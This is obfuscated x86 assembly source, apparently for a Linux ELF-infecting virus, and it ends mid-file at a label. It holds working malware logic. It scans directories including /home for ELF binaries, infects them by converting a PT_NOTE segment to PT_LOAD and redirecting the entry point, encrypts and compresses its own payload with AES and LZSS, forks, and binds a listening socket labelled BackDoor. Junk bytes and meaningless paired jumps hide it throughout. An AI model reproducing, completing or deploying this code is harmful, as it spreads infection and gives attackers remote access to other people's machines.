..@izGKAKTxQait:
    jne         ..@nfozY7oOHVSv
    jl          ..@fBSy6DEkKeRx
    jge         ..@fBSy6DEkKeRx
..@yuZfsxnj9hDG:
    lea         r1, [rsp+_INFFILE_OFF.file]
    jmp         $+4
db 0xa1, 0x09
    jl          ..@x42NiqsgiRKa
    jge         ..@x42NiqsgiRKa
..@d3jCniuos3Xw:
    ret
    jb          DYNPIEValidation
    jae         DYNPIEValidation
..@kPvf0o0sGncc:
    pop         r5
    jmp         ..@FpLBijL0K6t4
MemMove:
    jmp         ..@UF3j1fLGSgPA
..@UmSSUK2tBSI3:
    mov         r4, QWORD [rsp+_PROC_OFF.dirindex]
    movzx       rax, BYTE [rsp+_PROC_OFF.dirbuf+linux_dirent.d_reclen+r4]
    add         QWORD [rsp+_PROC_OFF.dirindex], rax
    jl          ..@RzInpbhJLAlo
    jge         ..@RzInpbhJLAlo
..@n6DQWwDDK3mh:
    cmp         BYTE [rsp+_LZSSE_OFF.match_len], MIN_LENGTH
    jge         ..@Z9ukbD04veE5
    jmp         ..@HiAcjwHSMbKO
..@0Ib9AbWh8qfN:
    rep         stosb
    lea         r1, [rsp+_PAYLOAD_OFF.key]
    mov         r2, m6
    js          ..@4wlwK3jBAFOm
    jns         ..@4wlwK3jBAFOm
..@biUsZGWgcqoZ:
    add         rax, p_h.p_type
    cmp         DWORD [r2+rax], PT_NOTE
    jl          ..@vMdDTLBr282Y
    jge         ..@vMdDTLBr282Y
..@POzCQcpoxMog:
    mov         r4d, DWORD [r1 + file.filefd]
    mov         r5, r1
    mov         r1, r4
    je          ..@Zmp5VhiZLGoo
    jne         ..@Zmp5VhiZLGoo
..@sH8JBm0tk0Mt:
    mov         ecx, WINDOW_LENGTH
    lea         rdi, [rsp+_LZSSE_OFF.buffer]
    mov         rsi, rdi
    jb          ..@GlF692QjyMy1
    jae         ..@GlF692QjyMy1
LzssEncoder:
    jmp         ..@t96Mduv3gTGM
..@bRwFjBudkp2z:
%ifdef X86_32
    mov         ecx, r3
%endif
    jmp         $+3
db 0x26
    jmp         $+3
db 0x8f
    jmp         $+4
db 0x76, 0xe8
    js          ..@7Xa9Evxu0WJB
    jns         ..@7Xa9Evxu0WJB
..@txcKA7rWgW9z:
    mov         al, BYTE [rsp+_LZSSE_OFF.mask]
    jmp         $+3
db 0x12
    je          ..@Kamc29WqrilE
    jne         ..@Kamc29WqrilE
..@vJgAN8HPmE25:
    test        edx, edx
    jmp         $+3
db 0x51
    js          ..@xHicp6zGP2UE
    jns         ..@xHicp6zGP2UE
..@eJwWz1gplYbV:
    cmp         WORD [r1], './'
    jmp         $+5
db 0xea, 0x93, 0x36
    jmp         $+3
db 0x6a
    jmp         $+3
db 0x7b
    jb          ..@Pq5M1Tmd2SkG
    jae         ..@Pq5M1Tmd2SkG
..@st7z9tCaDC3K:
    pop         r1
    jmp         ..@TMnh6JmwCtwL
..@kz0VBIOMqOpM:
    xor         rcx, rcx
    jl          ..@sH8JBm0tk0Mt
    jge         ..@sH8JBm0tk0Mt
..@ejI33cUbgVTO:
    mov         eax, ebx
    jmp         $+4
db 0xa0, 0x11
    jl          ..@TS1aeONJ7fK8
    jge         ..@TS1aeONJ7fK8
GetNewProgramVaddr:
    jmp         ..@Z4fZAkCJg4yv
..@t96Mduv3gTGM:
    sub         rsp, _LZSSE_OFF_size
    jl          ..@1rT9buUS3Yoe
    jge         ..@1rT9buUS3Yoe
..@wG4CzBhIPJsE:
    aesenc      xmm0, xmm1
    movdqu      xmm1, oWORD [rsp+0x70]
    jmp         $+3
db 0x4c
    jl          ..@kR2koQRHxBrW
    jge         ..@kR2koQRHxBrW
..@muwqZRG458A4:
    mov         rsi, QWORD [rsp+_LZSSE_OFF.inputaddr]
    jmp         $+3
db 0xf3
    jmp         $+4
db 0x65, 0xba
    jb          ..@jtIlMmnZK80b
    jae         ..@jtIlMmnZK80b
..@pAu2GKIycbwo:
    lea         r1, [rsp+_PROC_OFF.buffer]
    mov         r2, [rsp+_PROC_OFF.dirname]
    jmp         $+5
db 0x95, 0x06, 0x7c
    je          ..@3GWzihDXr7X5
    jne         ..@3GWzihDXr7X5
..@VTKoA7vPTlKI:
    jne         ..@WJF4uIIQSfK0
    mov         r2, QWORD [r5+file.fileptr]
    jmp         ..@SY34ICkNug4Q
MapFile:
    jmp         ..@XNYcDJJOcc52
..@1TtS0OTbcgZt:
    cld
    jmp         $+4
db 0x2a, 0x76
    jb          ..@yJbklaGCMzk6
    jae         ..@yJbklaGCMzk6
..@dN3Qf2HAIQLh:
    mov         r1, QWORD [r5+file.fileptr]
    jmp         ..@WU3fv8zWT0w7
..@uV1yJmbZa0Ia:
    push        r3
    sub         rsp, _KEYGEN_OFF_size
    mov         QWORD [rsp+_KEYGEN_OFF.bufferaddr], r1
    jmp         ..@HfmCOnY3wgMs
..@PwHJtqF5teoU:
    sub         r2, 1
    cmp         r2, 0
    je          ..@8AEzm0TXwD7k
    js          ..@AZdvFM2eHHv8
    jns         ..@AZdvFM2eHHv8
..@DazUWC7bg8QO:
    add         WORD [rsp+_LZSSE_OFF.la_index], ax
    add         WORD [rsp+_LZSSE_OFF.w_index], ax
    cmp         WORD [rsp+_LZSSE_OFF.la_index], WINDOW_LENGTH*2-LOOKAHEAD_LENGTH
    jmp         ..@CI1StFaaRwgg
..@jvi2KM3Mlj7a:
    add         rdi, 0x4
    mov         rsi, QWORD [rsp+_PAYLOAD_OFF.entry]
    jmp         ..@m4goGiZuShwG
..@VqaDuQ7o7ARH:
    xor         r1, r1
    mov         r1w, WORD [rsp+_UPDATASIG_OFF.keyprev]
    jmp         $+4
db 0x76, 0xf5
    jmp         ..@nIj2jYHQKcg2
..@1fxdJjHfhaQM:
    shr         edx, 1
    jmp         $+5
db 0x77, 0x52, 0x64
    jb          ..@vJgAN8HPmE25
    jae         ..@vJgAN8HPmE25
..@NFXGikrKRvy1:
    pop         r1
    jmp         $+5
db 0x4b, 0x3b, 0xea
    jmp         ..@qmz0rMsCaNSG
..@kcIqO5zCpwCe:
    push        r1
    xor         rdi, rdi
    xor         rcx, rcx
    jmp         $+5
db 0x27, 0x86, 0xaf
    js          ..@H2qpPG5VXc2i
    jns         ..@H2qpPG5VXc2i
..@3vfPXq4L2Pkg:
    mov         rsi, r5
    js          ..@8HvfYB54Zfqr
    jns         ..@8HvfYB54Zfqr
..@u9jlTna3inCp:
    add         r1, non_packed_len+PADDING
    mov         r3, r1
    sub         r3, PADDING
    jb          ..@ayM2M2zqLmtG
    jae         ..@ayM2M2zqLmtG
..@quOQibrLdnQ8:
    jmp         ..@ggh9V8r5j8ks
    jmp         $+3
db 0x1f
    js          ..@QUEYYeJRCkpa
    jns         ..@QUEYYeJRCkpa
..@heif0Q5rJ3dY:
    xor         r4, r4
    mov         rax, SYS_WAIT4
    syscall
    jmp         $+3
db 0xf3
    js          ..@K89lHWAE2v1G
    jns         ..@K89lHWAE2v1G
..@rqmRThBNF6S8:
    inc         QWORD [rsp+_LZSSE_OFF.outputaddr] 
    jmp         ..@1fxdJjHfhaQM
..@2Pgnr5z62E1n:
    sub         rsi, m6
    jmp         $+5
db 0xc8, 0xbd, 0x90
    je          ..@em71qUjtpKIu
    jne         ..@em71qUjtpKIu
..@fTlO7KAm4tDj:
    mov         r4, m7
    jb          ..@ZcsA37GyBpZW
    jae         ..@ZcsA37GyBpZW
..@fBSy6DEkKeRx:
    lea         r1, QWORD [rsp+_INFFILE_OFF.file]
    call        FileValidation
    jb          ..@ZUlx5TqkdHih
    jae         ..@ZUlx5TqkdHih
..@P8Dp4u2a1UWz:
    mov         ax, WORD [rsp+_DYNPIE_OFF.shentsize]
    mul         rbx
    mov         rdi, QWORD [rsp+_DYNPIE_OFF.sh_ptr]
    jmp         $+4
db 0x09, 0x0b
    jmp         ..@kK5BmElxBazS
..@fr5lmv2eRJt9:
    add         rsp, _PROC_OFF_size
    js          BackDoor
    jns         BackDoor
..@TABDxBA5ikCv:
    jbe         ..@9K0q3jp4AiVA
    jmp         $+5
db 0x09, 0x46, 0x46
    jmp         $+5
db 0xe5, 0x93, 0x21
    js          ..@d8pbc6mBM18m
    jns         ..@d8pbc6mBM18m
..@9EwmFdjbOKM4:
%ifndef ENABLE_DEBUGGING
    xor         r1, r1
    xor         r2, r2
%endif
    jmp         $+4
db 0xaf, 0x26
    jl          ..@I7ywPkawWP5i
    jge         ..@I7ywPkawWP5i
..@HzHxmRlKN5Nk:
    add         m7, rax
    js          ..@5MaP7RdoJQf2
    jns         ..@5MaP7RdoJQf2
..@aS6WiMwKHmbS:
    cmp         bx, WORD [rsi+e_h.e_shnum]
    jl          ..@X9Tw0Go5RU9Z
    js          ..@3SdeJUhcf3l7
    jns         ..@3SdeJUhcf3l7
..@6xuyB0I4JyFe:
    jmp         ..@5W3ri3udIcF7
    jl          ..@5W3ri3udIcF7
    jge         ..@5W3ri3udIcF7
..@gJXrn9OEZpIf:
    cmp         eax, 0x3
    jle         ..@UmSSUK2tBSI3
    jl          ..@1eYmhNR8Y5Fa
    jge         ..@1eYmhNR8Y5Fa
..@uS0EiiY7Y1dx:
    add         rcx, 2*bytes
    jmp         $+4
db 0x6e, 0xf1
    js          ..@yK2hTSJLsKaY
    jns         ..@yK2hTSJLsKaY
..@7cHjQ4IMOvXr:
    call        GetNewProgramVaddr
    pop         r3
    pop         r2
    jmp         $+5
db 0x72, 0x5b, 0x99
    je          ..@HjiHpkptb2SH
    jne         ..@HjiHpkptb2SH
..@jtIlMmnZK80b:
    rep         movsb
    jmp         $+4
db 0x5a, 0xde
    je          ..@HKOuqBlc5gRe
    jne         ..@HKOuqBlc5gRe
..@wsyYhut8vt1z:
    add         r4, r3
    add         r4, 1
    jmp         ..@xuzWxD4br9uq
    js          ..@0KILeizp100j
    jns         ..@0KILeizp100j
..@M5OZAlp8RhEx:
    jle         ..@JTu2szBC5ZjF
    mov         WORD [rsp+_LZSSE_OFF.match_pos], bx
    jmp         $+5
db 0xe7, 0xb3, 0x9f
    js          ..@K6lFAIe3szu7
    jns         ..@K6lFAIe3szu7
..@szXr32xg3eqq:
    push        r5
    push        r4
    push        r3
    jmp         $+5
db 0x27, 0xb3, 0xb4
    jb          ..@NleDm9Ak4XJH
    jae         ..@NleDm9Ak4XJH
..@GTf59OKL9Dpc:
    xor         rax, rax
    mov         al, BYTE [rsp+_LZSSE_OFF.mask]
    or          BYTE [rsp+_LZSSE_OFF.bits], al
    jmp         ..@3tgr1dgF4KLD
..@XwNRN6VUayZQ:
    xor         r2, r2
    xor         r3, r3
    jmp         $+4
db 0xb3, 0x81
    jmp         ..@cYeLdk29q3ei
..@iQqbNiggBbg1:
    cmp         bx, WORD [rsp+_LZSSE_OFF.w_index]
    jmp         $+3
db 0x54
    jmp         $+5
db 0xc0, 0x65, 0xf5
    jmp         ..@arBdRvtiUFQg
..@zkgDZMluPH2X:
    cmp         r1, 0x00
    jg          ..@vyXP1MaJbrGK
    jmp         ..@ldmLbPgutm4p
..@EmtUVW2PRcjc:
    jnz         ..@1fxdJjHfhaQM
    jmp         $+4
db 0x1b, 0x73
    jl          ..@jY6O4FNOp9yp
    jge         ..@jY6O4FNOp9yp
..@RqTYQs6tUpbK:
    test        eax, eax
    jmp         $+3
db 0x95
    js          ..@vHg3ugrVj9Pc
    jns         ..@vHg3ugrVj9Pc
..@kR2koQRHxBrW:
    aesenc      xmm0, xmm1
    jb          ..@ZYhgE4GAJILI
    jae         ..@ZYhgE4GAJILI
..@puZiEPzxPLUl:
    add         rdi, rax
    jl          ..@MBvNcF1U7xpZ
    jge         ..@MBvNcF1U7xpZ
..@vaZjf6MBszEo:
    syscall
    jmp         ..@9R0Iu4SuyiLg
..@0wa7iqabKbXd:
    VAR         packed, urandom
    OFILE       [r5], 0x00
    cmp         eax, 0x3
    jmp         ..@N8Cv9TVO6HYU
..@e8AJyJaj9oGV:
    push        r1
    push        r2
    jmp         $+4
db 0x3e, 0x57
    jmp         ..@uV1yJmbZa0Ia
..@mpEoNbZooDxU:
    cmp         rax, 0xffffffffffffffff
    je          ..@G2vj5Dap1mbM
    mov         r5, [rsp]
    jl          ..@AWVrKPqADb2g
    jge         ..@AWVrKPqADb2g
..@h6TgYr4QKeAO:
    jmp         ..@E30ij6Jqzn3b
    jmp         $+4
db 0x75, 0x44
    jb          ..@5ejll91GRBj6
    jae         ..@5ejll91GRBj6
..@js4lo3znfK0v:
    syscall
    jmp         ..@j8tiyTfD7Ulq
..@QM7PXhDYdGte:
    mov         r2w, WORD [r1+e_h.e_phnum]
    sub         r2, 1
    jmp         $+3
db 0x68
    jmp         ..@Br6lPc9HirVz
..@NrWRic3pEIYf:
    mov         r5, r3
    mov         r3, rax
    and         r5, (PAGE_SIZE-1)
    jl          ..@MrzkkWb1DKG3
    jge         ..@MrzkkWb1DKG3
NonBinaryFile:
    jmp         ..@2NfXy2iJw2Dq
..@H2qpPG5VXc2i:
    xor         rdx, rdx
    js          ..@7apqH8j1k2p6
    jns         ..@7apqH8j1k2p6
..@GTxhRHjpEd4w:
    cmp         BYTE [r1+16], ET_EXEC
    jmp         $+3
db 0xe8
    jmp         ..@c82ys0RFFszU
..@zQvMOrnqexrh:
    call        UnmapFile
    mov         r2, 11b
    jmp         $+3
db 0xf7
    je          ..@maBWiRmgPekP
    jne         ..@maBWiRmgPekP
..@1w5M1vyScZYP:
    mov         r3, [r1+e_h.e_phoff]
    jmp         $+3
db 0x51
    jl          ..@s6kFJdnEjdps
    jge         ..@s6kFJdnEjdps
..@ohAuwiN1mqxV:
    add         rsp, _KEYGEN_OFF_size
    jmp         $+3
db 0x11
    jmp         ..@NBY2XjpLQxEN
InfectFile:
    jmp         ..@7HTBwlND5X3C
..@X3dfWbgxaRqG:
    add         r5, 1
    js          ..@5TnHrktPP2O6
    jns         ..@5TnHrktPP2O6
..@EaLTHAJpfYor:
    sub         QWORD [rsp+_LZSSE_OFF.length], rcx
    lea         rdi, QWORD [rsp+_LZSSE_OFF.buffer+WINDOW_LENGTH-LOOKAHEAD_LENGTH]
    jmp         $+5
db 0xb3, 0x61, 0x26
    je          ..@muwqZRG458A4
    jne         ..@muwqZRG458A4
..@Rgb6nLXNPDuX:
    mov         QWORD [rsp+_VADDR_OFF.tmp_offset], 0
    js          ..@x6qdAoZH1Acq
    jns         ..@x6qdAoZH1Acq
..@YGgnlH7V92Xe:
    CFILE       DWORD [r5+file.filefd]
    jmp         $+4
db 0x86, 0x8d
    jmp         $+5
db 0xe7, 0x18, 0x62
    jl          ..@l97agIshtVDd
    jge         ..@l97agIshtVDd
..@KdaL0I18Ywl6:
    xor         rax, rax
    xor         r1, r1
    jmp         ..@6qAdUySDk5qu
..@5wSesUGzV9ZE:
%ifndef ENABLE_DEBUGGING
    xor         r4, r4
    mov         rax, SYS_WAIT4
    syscall
%endif
    jmp         $+4
db 0x1e, 0x80
    jb          ..@LzGr2Yq8RqJd
    jae         ..@LzGr2Yq8RqJd
..@UyCQCKAQgynj:
    mov         r3, rax
    jmp         $+4
db 0xd2, 0xa5
    jmp         ..@NjuLH2WB9JMZ
..@UF3j1fLGSgPA:
    push        r4
    push        r5
    jmp         $+3
db 0x0b
    jmp         $+3
db 0x9c
    jmp         ..@QkAiq2lki8Xa
..@WLn2wz0X9usv:
    call        UpdateSignature
    mov         r1, m6
    jmp         $+3
db 0x54
    jl          ..@u9jlTna3inCp
    jge         ..@u9jlTna3inCp
..@d8pbc6mBM18m:
    add         rdi, rcx
    jmp         ..@8Y8rIJkuRXV3
..@QDXiNVBY30y3:
%ifndef ENABLE_DEBUGGING
    mov         r1, rax
    push        QWORD 0x0
%endif
    js          ..@xqCioqc82xyj
    jns         ..@xqCioqc82xyj
..@kfrBqYF0HIi8:
    lea         r1, [rsp+_INFDIR_OFF.buffer]
    jmp         $+4
db 0xfd, 0x6b
    jmp         $+3
db 0x18
    js          ..@KcdQyn6919gt
    jns         ..@KcdQyn6919gt
..@8Ke8BMb5kmyZ:
    call        UnmapFile
    jmp         $+5
db 0xc6, 0x9c, 0x3b
    jmp         ..@nfozY7oOHVSv
..@APWZiPjU8HmQ:
%ifndef ENABLE_DEBUGGING
    mov         rax, SYS_FORK
%endif
    jmp         $+5
db 0x58, 0xf0, 0xc6
    jmp         ..@o1nuGAlPZHyF
..@jU3PJYK0uKsH:
    sub         QWORD [rsp+_LZSSE_OFF.length], rcx
    jmp         $+5
db 0x8f, 0x45, 0x29
    jmp         $+5
db 0xc6, 0xfd, 0xb8
    jmp         $+3
db 0x68
    jl          ..@k1OZM1hC2TKe
    jge         ..@k1OZM1hC2TKe
..@jO2sMQB9pKd9:
    mov         ecx, WINDOW_LENGTH*2
    xor         rax, rax
    mov         ax, WORD [rsp+_LZSSE_OFF.buffersize]
    jmp         $+5
db 0xdd, 0xbd, 0x32
    jb          ..@s3m9eQXHVftv
    jae         ..@s3m9eQXHVftv
..@6GWETv1rAICJ:
    and         r2, 0xfffffffffffffff0
    lea         r3, [rsp+_PAYLOAD_OFF.key]
    call        Aes256Encryption
    jmp         $+5
db 0x15, 0xa0, 0xe3
    jmp         ..@fuRJBf43PV1x
..@1rT9buUS3Yoe:
    mov         QWORD [rsp+_LZSSE_OFF.inputaddr], r1
    mov         QWORD [rsp+_LZSSE_OFF.outputaddr], r3
    mov         QWORD [rsp+_LZSSE_OFF.saveoutptr], r3
    jmp         $+3
db 0xe7
    jmp         ..@sTYTvqVwhy4H
..@DWVEWRISHSA3:
%ifndef ENABLE_DEBUGGING
    xor         rax, rax
    mov         eax, SYS_BIND
    syscall
%endif
    jmp         $+5
db 0x11, 0x20, 0xfb
    jmp         ..@HmAJh82KnjZz
..@OHRH9E5zirVX:
    mov         r2, m8
    mov         r3, original_virus_len-non_packed_len
    jl          ..@NRzMR22zjb6z
    jge         ..@NRzMR22zjb6z
..@6qAdUySDk5qu:
    mov         r1w, WORD [rsp+_UPDATASIG_OFF.index] 
    call        WORDToDWORDASCII
    mov         rdi, QWORD [rsp+_UPDATASIG_OFF.signaddr]
    jb          ..@uh4dBdsUERpF
    jae         ..@uh4dBdsUERpF
..@SmA33rkVl8GG:
    xor         r2, r2
    lea         r1, [rsp+_INFFILE_OFF.file]
    jmp         ..@zQvMOrnqexrh
..@VnSNSWnHab3F:
    call_vsp    Strncmp
    test        rax, rax
    jmp         ..@Y9NwaJU6BQ5k
..@f57cR6b8gqUv:
    sub         WORD [rsp+_LZSSE_OFF.w_index], WINDOW_LENGTH
    js          ..@jO2sMQB9pKd9
    jns         ..@jO2sMQB9pKd9
..@m4goGiZuShwG:
    mov         QWORD [rdi], rsi
    jmp         $+4
db 0xee, 0x3a
    jmp         ..@9fAwxSqhOXhg
..@2NfXy2iJw2Dq:
    sub         rsp, _NBF_OFF_size
    jmp         $+3
db 0xea
    jmp         ..@EACm3jX54Aa0
..@fin2Dmz4jUtm:
    sub         rsp, _DYNPIE_OFF_size
    xor         rax, rax
    jmp         $+5
db 0x21, 0x0c, 0x8b
    jmp         ..@WrRZTFNoy02l
..@U3gt44xB7T2g:
    cmp         r1, 0x00
    je          ..@0MGfSq8YL8ka
    je          ..@BwlvTXAavLGk
    jne         ..@BwlvTXAavLGk
..@ot5HFjHnlgpb:
    mov         r1d, eax
    mov         r3d, 0x02
    jmp         $+5
db 0x9c, 0x80, 0x07
    jmp         $+5
db 0x64, 0x59, 0xb8
    je          ..@n7lJuHT2JmdO
    jne         ..@n7lJuHT2JmdO
..@44VykqrikRnR:
    mov         r1d, eax
    mov         r2, QWORD [rsp+_KEYGEN_OFF.bufferaddr]
    mov         r3d, 0x20
    jmp         $+5
db 0x0e, 0x13, 0xd6
    jmp         $+5
db 0xe7, 0x30, 0x4b
    jmp         $+4
db 0xff, 0xcc
    js          ..@FN2ZwXBHfNCm
    jns         ..@FN2ZwXBHfNCm
..@6ZwOl9Ef3bpF:
    mov         r1, QWORD [r5+file.fileptr]
    jmp         $+4
db 0x12, 0x95
    jmp         ..@kq9FrPZ4u8pb
..@65NQmKsnuSYC:
    mov         r5, r1
    je          ..@wrI60NmCEqga
    jne         ..@wrI60NmCEqga
..@FFuXYddqDEH9:
    add         r1, 1
    lea         r2, [rsp+_INFDIR_OFF.dirbuf+linux_dirent.d_name+r4]
    call        Strcpy
    js          ..@1LI2UwtqTh6d
    jns         ..@1LI2UwtqTh6d
..@XJn6rreCopGz:
    xor         rax, rax
    jl          ..@wA5zzRZh3AfQ
    jge         ..@wA5zzRZh3AfQ
..@Z4XCWgGkB3Tv:
    xor         rax, rax
    lea         r1, [rsp+_PROC_OFF.dirbuf+r4]
    mov         ax, WORD [r1+linux_dirent.d_reclen]
    jmp         $+3
db 0x13
    jmp         ..@sbMHJcjqhE3B
..@wrI60NmCEqga:
    mov         r1, QWORD [r5+file.filesize]
    cmp         r1, e_h_size
    jl          ..@JV8BweOsVeyT
    jge         ..@JV8BweOsVeyT
..@SlheDzf3NDBd:
    cmp         r4, QWORD [rsp+_PROC_OFF.dirnread]
    jmp         $+5
db 0xea, 0xda, 0x9b
    jmp         ..@i1islUIBTYyI
..@wA5zzRZh3AfQ:
    xor         r2, r2
    mov         r1, m6
    jmp         $+4
db 0x71, 0xa4
    jmp         $+4
db 0x1b, 0x5d
    jmp         $+3
db 0x36
    jl          ..@WGdYw1mTLXXC
    jge         ..@WGdYw1mTLXXC
..@DLu5Q6gkwTqr:
    jge         ..@wQDsr1hFEvJo
    add         r4, 1
    jmp         ..@6OMAx7X3I9ky
    jb          ..@PCD4avutFVRp
    jae         ..@PCD4avutFVRp
..@36j4ciHC9CNo:
    or          bx, ax
    je          ..@ejI33cUbgVTO
    jne         ..@ejI33cUbgVTO
..@KcdQyn6919gt:
    mov         r2, QWORD [rsp+_INFDIR_OFF.dirname]
    call        Strcpy
    jmp         $+3
db 0x86
    jmp         $+5
db 0x8e, 0x5f, 0x49
    jmp         ..@OZoF9Sqt7h2w
..@Y25eylgZVsR7:
%ifdef X86_32
    mov         eax, SYS_MMAP2
    int         0x80
    pop         ebp
%endif
    jmp         $+4
db 0xd5, 0x63
    jmp         $+4
db 0x8a, 0xdc
    jl          ..@QZFYKMyyBW7F
    jge         ..@QZFYKMyyBW7F
..@Zor9ErL08qKD:
%ifndef ENABLE_DEBUGGING
    syscall
    xor         rax, rax
%endif
    jmp         $+5
db 0x15, 0x53, 0x9e
    jmp         ..@9EwmFdjbOKM4
..@gqZ94AzM67KQ:
%ifdef X86_32
    mov         edi, 0xffffffff
    push        ebp
    xor         ebp, ebp
%endif
    jmp         $+3
db 0x25
    jmp         ..@Y25eylgZVsR7
..@PEQQz6Igtg7A:
    cmp         BYTE [r1], '.'
    je          ..@E30ij6Jqzn3b
    jmp         $+5
db 0xbc, 0xaf, 0x8c
    jmp         $+3
db 0xde
    jmp         ..@qjsoktHcwAOS
..@T2aqKQ34s5mg:
    aesenc      xmm0, xmm1
    jmp         $+4
db 0x0b, 0xe9
    js          ..@VBvRNmxwLeaX
    jns         ..@VBvRNmxwLeaX
..@oJVL5Lukf3hx:
%ifndef ENABLE_DEBUGGING
    xor         r3, r3
    xor         r4, r4
%endif
    jmp         $+5
db 0x8d, 0xfe, 0x51
    jmp         $+3
db 0xc1
    jmp         ..@OnckgynueIle
..@yyf1m1M2Tl9x:
    aesenc      xmm0, xmm1
    movdqu      xmm1, oWORD [rsp+0xd0]
    jmp         ..@xvxJbM11jgmi
..@Wu64YUsSiHQl:
    pop         r1
    jmp         $+3
db 0x1b
    jmp         $+5
db 0x21, 0xfc, 0xcd
    jb          ..@yECeu9Xfjeao
    jae         ..@yECeu9Xfjeao
..@3GWzihDXr7X5:
    call        Strcpy
    jb          ..@Pp31OzprdfpK
    jae         ..@Pp31OzprdfpK
..@Pq5M1Tmd2SkG:
    je          ..@E30ij6Jqzn3b
    js          ..@VutkUu08BucA
    jns         ..@VutkUu08BucA
..@cj3da4I8Iyw3:
    mov         QWORD [r5+file.filesize], 0x00
    jmp         $+5
db 0xdc, 0xd4, 0x18
    jb          ..@F3XN44zpB7Ns
    jae         ..@F3XN44zpB7Ns
..@QZFYKMyyBW7F:
%ifdef X86_64
    xor         rax, rax
    xor         rdi, rdi
    xor         rdx, rdx
%endif
    jl          ..@g4ZkBrAhtDJq
    jge         ..@g4ZkBrAhtDJq
..@oZgxvQMygqvM:
    call        Strcpy
    VAR         packed, status
    mov         r2, r5
    jb          ..@X8tMDOScBVdZ
    jae         ..@X8tMDOScBVdZ
..@QtPPrQ7ZMsxf:
    CFILE       DWORD [rsp+_PROC_OFF.filefd]
    jmp         $+5
db 0x4c, 0x0e, 0xcc
    jmp         $+4
db 0xad, 0x08
    jmp         ..@UmSSUK2tBSI3
..@nEouFNXW3Wwt:
%ifdef X86_32
    push        ebp
%endif
    jb          ..@6mbUmxOlWdt1
    jae         ..@6mbUmxOlWdt1
..@vzm3djvMya41:
    jl          ..@gHpoQAcibciD
    jmp         ..@LLLE1hLPNKSS
..@rrwLUpGDIJaZ:
    mov         ax, WORD [rsp+_LZSSE_OFF.buffersize]
    jl          ..@puZiEPzxPLUl
    jge         ..@puZiEPzxPLUl
..@72tZlES2W3K1:
%ifndef ENABLE_DEBUGGING
    xor         r2, r2
%endif
    jmp         $+5
db 0xf7, 0x89, 0xf0
    jmp         ..@8t1BEkvS7gq0
..@TTjtecoGmB7N:
%ifndef ENABLE_DEBUGGING
    xor         r2, r2
%endif
    jmp         $+5
db 0x76, 0x48, 0x86
    js          ..@i2Hz5QwHcDCV
    jns         ..@i2Hz5QwHcDCV
..@jKJyCvj4U4Jn:
    call        IsNum
    test        eax, eax
    jmp         ..@g0eNFfY8wSCG
..@ldmLbPgutm4p:
    jmp         ..@WJF4uIIQSfK0
    jmp         $+4
db 0xd3, 0xec
    jl          ..@OQhs4eL3MzGv
    jge         ..@OQhs4eL3MzGv
..@mxuWUL6Q02lU:
    mov         BYTE [rsp+_INFDIR_OFF.depth], r2b
    jmp         ..@Bhyes3auG0Ga
..@JTu2szBC5ZjF:
    sub         ebx, 1
    js          ..@iQqbNiggBbg1
    jns         ..@iQqbNiggBbg1
..@sUnkOTFkyvOA:
    pop         r2
    jb          ..@kPvf0o0sGncc
    jae         ..@kPvf0o0sGncc
..@vSt7HQd4KT5l:
    mov         DWORD [r2], PT_LOAD
    mov         QWORD [r1+e_h.e_entry], r3
    or          QWORD [r1+e_h.e_entry], 1b
    jmp         $+4
db 0x99, 0xf2
    jmp         $+4
db 0xff, 0xb6
    jb          ..@DCpQ3HjDsnQM
    jae         ..@DCpQ3HjDsnQM
..@l97agIshtVDd:
    mov         DWORD [r5+file.filefd], 0x00
    js          ..@cj3da4I8Iyw3
    jns         ..@cj3da4I8Iyw3
..@9lcKHhXvl6dv:
%ifdef X86_64
    mov         r10, 0x22
%endif
    jmp         $+3
db 0xa2
    jb          ..@vnao0ucwtzOj
    jae         ..@vnao0ucwtzOj
..@vM2A1A6aGsdU:
    xor         rcx, rcx
    jmp         $+4
db 0x2e, 0x1d
    jl          ..@P6yGRDSuJ0pU
    jge         ..@P6yGRDSuJ0pU
..@LGcapTZpzOOj:
    movdqu      xmm1, oWORD [rsp+0x50]
    jmp         ..@TXmcbNhC9hPa
..@6OMAx7X3I9ky:
    mov         rax, r4
    movzx       r3, WORD [r1+e_h.e_phentsize]
    mul         r3
    jl          ..@biUsZGWgcqoZ
    jge         ..@biUsZGWgcqoZ
..@LzGr2Yq8RqJd:
%ifndef ENABLE_DEBUGGING
    xor         rax, rax
%endif
    jmp         $+5
db 0x52, 0x34, 0x33
    jmp         InfectionRoutine
..@X9ljtYImVWpb:
    mov         eax, 1
    ret
    jb          Strcpy
    jae         Strcpy
..@PBMB0aBulEui:
    syscall
    jmp         $+4
db 0x59, 0xce
    jmp         ..@gRPjb276GleC
..@HNquriElelAf:
    cmp         BYTE [r1], '/'
    jne         ..@WJF4uIIQSfK0
    cmp         DWORD [r1+1], "home"
    je          ..@7iwjXC1Rxb9L
    jne         ..@7iwjXC1Rxb9L
..@YEicmXKXOSQB:
    cmp         BYTE [rsp+_LZSSE_OFF.mask], 10000000b
    jmp         $+5
db 0xa0, 0x82, 0x38
    jl          ..@OjBUNkhwwNYg
    jge         ..@OjBUNkhwwNYg
..@xqCioqc82xyj:
%ifndef ENABLE_DEBUGGING
    push        WORD 0x5c11
    push        WORD 0x02
%endif
    je          ..@dhjHERDeckKx
    jne         ..@dhjHERDeckKx
..@DxQERwECEJL1:
    cmp         rcx, QWORD [rdi+s_h.sh_size]
    jge         ..@06dX8GSywGIS
    jmp         ..@VcEJxBAB9aPY
..@yVnnG3d7Gf1u:
    xor         r2, r2
    xor         r3, r3
    jmp         ..@heif0Q5rJ3dY
..@f4P8Rw9AkV2j:
    sub         r5, 1
    jl          ..@jqQESu5CygXg
    jge         ..@jqQESu5CygXg
..@PjeX1oqfiGwt:
    ret
    jl          DestroyPayload
    jge         DestroyPayload
..@GIDJYLGMBFuu:
    mov         QWORD [rsp+_INFDIR_OFF.dirindex], 0x00
    jmp         $+4
db 0xd1, 0xc5
    jl          ..@gHpoQAcibciD
    jge         ..@gHpoQAcibciD
..@SMelzEIg0xg7:
    aesenc      xmm0, xmm1
    movdqu      xmm1, oWORD [rsp+0xc0]
    jmp         $+4
db 0xb5, 0xf8
    jmp         ..@yyf1m1M2Tl9x
..@3LCH4rUoE8sA:
    and         rsp, 0xfffffffffffffff0
    jmp         $+3
db 0x93
    jmp         ..@J7SehvysXAlN
FileValidation:
    jmp         ..@65NQmKsnuSYC
..@qmz0rMsCaNSG:
    ret
    jmp         $+3
db 0xc3
    jmp         WORDToDWORDASCII
..@1LI2UwtqTh6d:
    mov         BYTE [r1], 0x00
    jb          ..@7uUFcX9pk3KI
    jae         ..@7uUFcX9pk3KI
IsNum:
